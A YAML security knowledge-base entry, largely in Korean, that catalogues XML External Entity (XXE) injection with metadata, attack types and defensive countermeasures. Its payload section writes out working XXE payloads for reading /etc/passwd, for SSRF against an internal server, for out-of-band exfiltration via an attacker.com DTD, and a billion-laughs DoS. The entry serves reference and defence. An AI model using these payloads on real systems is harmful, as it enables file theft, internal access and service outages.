# GR Atom: XML External Entity (XXE) Injection
# Version: 1.0
# Created: 2025-01-29

identity:
  id: "ATK-INJECT-XML-001"
  name: "XML External Entity Injection (XXE)"
  normalization:
    normalized_name: "xxe xml external entity injection"
    normalization_version: "1.0"
  aliases:
    - "XXE"
    - "XXE Injection"
    - "XML Injection"
    - "External Entity Attack"

classification:
  domain: security
  type: technique
  abstraction_level: 3
  gr_coordinates:
    layer: "L7"
    zone: "Zone2"
    tags: ["INJ", "EXPLOIT", "WEB", "API"]

definition:
  what: |
    XXE는 XML 파서의 External Entity 처리 기능을 악용하여 서버의
    로컬 파일을 읽거나, SSRF를 수행하거나, DoS를 유발하는 취약점이다.
    XML을 입력으로 받는 모든 기능에서 발생할 수 있다.
  why: |
    OWASP Top 10에 포함된 심각한 취약점이다. 서버 내부 파일(/etc/passwd,
    설정 파일 등)을 읽을 수 있고, SSRF를 통해 내부 네트워크에 접근할 수
    있다. SOAP API, 파일 업로드 등에서 자주 발견된다.
  how: |
    1. 공격자가 악성 DTD/Entity가 포함된 XML 전송
    2. 취약한 XML 파서가 External Entity 처리
    3. file:// 프로토콜로 로컬 파일 읽기
    4. http:// 프로토콜로 SSRF 수행
    5. 결과가 응답에 포함되거나 OOB 채널로 추출

relations:
  structural:
    is_a: ["GR-SEC-CON-00001"]  # Injection의 하위 개념
  causal:
    causes:
      - "ATK-SERVER-SSRF-001"   # SSRF 유발
    enables:
      - "VUL-DATA-EXPOSURE-001" # 파일 유출
  conditional:
    requires:
      - "TECH-FORMAT-XML-001"   # XML 지식
  applicability:
    applies_to:
      - "INFRA-APP-WEBAPP-001"
      - "INFRA-APP-API-001"

properties:
  technical:
    attack_types:
      - name: "Classic XXE"
        description: "Entity 값이 응답에 직접 포함"
        example: "파일 내용이 에러/응답에 표시"
      - name: "Blind XXE"
        description: "응답에서 결과를 볼 수 없음"
        subtypes:
          - "Error-based"
          - "Out-of-Band (OOB)"
      - name: "Billion Laughs (DoS)"
        description: "재귀적 Entity 정의로 메모리 고갈"
    common_payloads:
      file_read:
        - |
          <?xml version="1.0"?>
          <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
          ]>
          <data>&xxe;</data>
      ssrf:
        - |
          <?xml version="1.0"?>
          <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "http://internal-server/admin">
          ]>
          <data>&xxe;</data>
      oob_exfiltration:
        - |
          <?xml version="1.0"?>
          <!DOCTYPE foo [
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
            %dtd;
          ]>
          <data>&send;</data>
      billion_laughs:
        - |
          <!DOCTYPE lolz [
            <!ENTITY lol "lol">
            <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
            <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
            ...
          ]>
    vulnerable_contexts:
      - "SOAP Web Services"
      - "REST API (XML input)"
      - "File Upload (SVG, DOCX, XLSX)"
      - "RSS/Atom Feed Parsing"
      - "SAML Authentication"
  security:
    impact:
      confidentiality: "HIGH - 파일/데이터 유출"
      integrity: "LOW"
      availability: "HIGH - DoS 가능"
    cvss_base: 7.5
    mitre_attack:
      technique_id: "T1190"
      tactic: "Initial Access"
    cwe_id: "CWE-611"
    owasp: "A05:2017 - XXE"
  countermeasures:
    primary:
      - name: "External Entity 비활성화"
        description: "XML 파서 설정에서 DTD, External Entity 처리 비활성화"
        effectiveness: "HIGH"
        examples:
          java: "factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)"
          python: "defusedxml 라이브러리 사용"
          php: "libxml_disable_entity_loader(true)"
    secondary:
      - name: "JSON 사용"
        description: "가능하면 XML 대신 JSON 사용"
        effectiveness: "HIGH"
      - id: "DEF-PREVENT-INPUTVAL-001"
        name: "입력 검증"
        effectiveness: "MEDIUM"

metadata:
  trust:
    source: official
    references:
      - "OWASP XXE Prevention Cheat Sheet"
      - "CWE-611"
    confidence: 1.0
    verified:
      status: verified
      date: 2025-01-29
      by: "GR System"
  temporal:
    created: 2025-01-29
    modified: 2025-01-29
    revision: 1
  security:
    sensitivity: public
    weaponization_risk: medium
  ai:
    embedding_text: |
      XXE XML External Entity Injection은 XML 파서의 External Entity 기능을
      악용하여 서버 파일을 읽거나 SSRF를 수행하는 취약점이다.
      file:// 프로토콜로 /etc/passwd 등을 읽고, http://로 내부 서버에 요청한다.
      SOAP API, SVG/DOCX 업로드, SAML에서 발견된다. XML 파서에서
      External Entity 처리를 비활성화하여 방어한다.
    search_keywords:
      - "XXE"
      - "XML External Entity"
      - "XML Injection"
      - "SSRF via XXE"
    related_queries:
      - "XXE란?"
      - "XXE 공격 방법"
      - "XXE 방어 방법"
      - "Blind XXE"
